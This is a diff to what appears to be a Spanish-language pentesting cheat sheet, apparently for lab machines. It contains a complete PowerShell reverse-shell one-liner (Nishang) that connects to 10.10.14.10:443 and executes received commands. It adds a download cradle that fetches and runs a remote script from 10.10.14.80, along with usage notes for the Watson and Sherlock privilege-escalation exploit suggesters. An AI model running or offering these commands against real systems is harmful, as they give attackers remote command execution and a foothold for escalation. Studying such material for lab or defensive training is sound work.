@@ -100,6 +100,8 @@ Powershell one liner Invoke-PowerShellTcpOneLine.ps de Nishang
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
+
+
 ## Sudo
 
 ```
@@ -1077,7 +1079,30 @@ Pero el HFS corre en 32 recuerda. La siguiente ruta va a lanzar el ps en 32bits
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 
+## PowerShell descargar a memoria 
 
+```
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/iisfinal.txt')
+```
+
+## Watson (Exploit Suggester)
+
+Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.
+
+> https://github.com/rasta-mouse/Watson
+
+Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.
+
+## Sherlock (Exploit Suggester)
+
+Esta es el predesesor de Watson y es un script en powershell ya sabes esta descontinuado casi a la par del Watson
+
+```
+Import-Module Sherlock.ps1
+Y ya despues que buesque
+Find-AllVulns
+```
+> https://github.com/rasta-mouse/Sherlock
 
 
 
